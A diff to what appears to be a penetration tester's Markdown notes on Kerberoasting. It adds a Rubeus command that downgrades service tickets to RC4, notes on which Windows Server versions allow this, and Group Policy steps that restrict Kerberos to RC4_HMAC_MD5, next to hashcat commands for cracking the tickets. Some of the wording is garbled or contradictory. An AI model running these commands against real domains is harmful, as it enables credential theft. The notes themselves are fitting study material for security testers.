@@ -875,6 +875,9 @@ Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supp
 
 # get ticket (we can see the supported Encryption type also)
 .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+# downgrade to RC4
+.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
 ```
 | Hash Prefix       | Encryption Type | Etype Number | Hashcat ID |
 |-------------------|-----------------|--------------|------------|
@@ -887,4 +890,16 @@ Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supp
 hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
 
 hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
+```
+
+- `RC4` is the fastest to crack
+- downgrading do now work after windows server 2019 and above
+- Windows Server 2019 Domain Controller will always return a service ticket encrypted with the highest level of encryption supported by the target account. 
+- Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets
+- edit encryption types used by Kerberos
+```
+It is possible to edit the encryption types used by Kerberos.
+This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options,
+then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos.
+Removing all other encryption types except for RC4_HMAC_MD5
 ```
